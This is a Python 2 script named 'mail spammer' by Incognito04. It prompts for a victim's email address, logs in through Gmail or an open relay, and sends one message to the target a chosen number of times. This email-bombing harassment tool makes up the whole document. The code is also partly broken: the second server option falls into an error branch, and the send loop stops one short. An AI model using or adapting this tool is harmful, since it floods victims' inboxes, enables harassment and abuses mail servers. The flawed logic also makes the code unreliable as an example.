#!/usr/bin/python
# -*- coding: utf-8 -*-
# mail spammer by Incognito04

import platform
import smtplib
import getpass
import os	
from time import gmtime, strftime, sleep
import random

def logo():
	print "\033[27m"
	print " \033[07m Delivering your emails \033[27m                        # ѕpaммer.py "    
	print "\033[27m      \                                          # Email ѕpammer            "
	print "\033[27m       \    \033[27m              |   ))/   ))\033[27m           # ѕoon with threading and proxy            "
	print "      \033[27m  \   \033[27m \\    ^ ^     |    /      ))\033[27m         # Can be annoying if Abused      "
	print "       \033[27m  \  \033[27m  \\(((  )))   |   /        ))\033[27m        # Art work from http://ascii.co.uk/art/unicorn					"
	print "       \033[27m   \ \033[27m   / G    ))) |  /        ))\033[27m    "
	print "             |o  _)   ))) | /       )))          [ Coded by Incognito04 ]			"
	print "              --' |     ))`/      )))"
	print "               ___|              )))"
	print "              / __\             ))))`()))"
	print "             /\@   /             `(())))"
	print "             \/   /  /`_______/\   \  ))))"
	print "                  | |          \ \  |  )))"
	print "                  | |           | | |   )))"
	print "                  |_@           |_|_@    ))"
	print """                  /_/           /_/_/ 

"""

def clear():
    if platform.system() == ("Linux"):
	os.system("clear")

    if platform.system() == ("Windows"):
	os.system("cls")

    if platform.system() != ("Windows"):
	os.system("clear")
	
if platform.system() == ("Windows"):
	queury = raw_input("May be some bugs when running in Windows. continue any way? {return} to continue, control c to close")
resize = raw_input("\nIf not open in full-screen then please resize. {return} to continue.")
clear()

class colours():
    white = '\33[27m' 
    blue = '\033[36m'
    red = '\033[31m'

def main():

    logo()

    try:
	try:
	    sender = raw_input(colours.blue + 'spammer:victims_email\33[33m>\33[32m targets email address\33[36m:')
	    print(""" 
 1. Use a gmail Account for your email attack.
	                                  
 2. Use your own server or open relay 
""")
	    server1 = raw_input("\33[36mspammer:option\33[33m>\33[32m choose which option to use\33[36m:")
	    if server1 == '2':
	    	server1 = raw_input('\nspammer:server\33[33m>\33[32m name of server to use example [smtp.yourserver.com]\33[36m:')	
		port = int(raw_input('\nspammer:port>\33[32m port of server example [25]\33[36m:'))
 
	    email = raw_input(colours.blue + 'spammer:username\33[33m>\33[32m email login\33[36m:')
	    password = getpass.getpass('spammer:password\33[33m>\33[32m password for account [BLANK]\33[36m:')
	    msg = raw_input('spammer:message\33[33m >\33[32m message to send\33[36m:')
	    number = int(raw_input('spammer:spam\33[33m>\33[32m amount of times to spam:\33[36m'))
	    

	    if server1 == '1':
		print(colours.blue + '\n[*]Logging in using gmail...\n\33[27m')
	    	server1 = 'smtp.gmail.com'	
		port = '587'
	    else:
		print("\033[31m\nOH Oh you mistyped something\33[27m")
		sleep(2)
		clear()
		main()
	except KeyboardInterrupt:
		print("\n\nGoodbye :-)")
	        sleep(1)
       	        exit()

    except ValueError:
		print('\033[31m\n[]Make sure you type your intergers correctly.\33[27m:')
		sleep(2)
		clear()       
		main()
	    
    try:
	server = smtplib.SMTP(server1, port)
	server.starttls()
	server.login(email, password)
    except:
	print('\033[31m\n[-]Make sure you are connected to the internet and that the information you supplied is correct.\33[27m')
	sleep(2)
	clear()
	main()
    
    for i in range (1,number):
    	server.sendmail(email, sender, msg)
        print('\033[36m\n[+] Mail sent: ' + str(i))
    server.quit()

    answer = int(number) / int(i)	

    if answer == 1:
	answer = '100%'
   
    answer = raw_input(colours.blue + '\n\nAll emails sent. Do you want to continue? [Y/n]')
    if answer.lower() == 'y':
	clear()	
	main()
    else:
	print('\033[36mClosing\33[27m')    
    	exit()
    try:
	main()
    except KeyboardInterrupt:
	print(colours.blue + '\n\nGoodbye :-)\33[27m')
    
main()
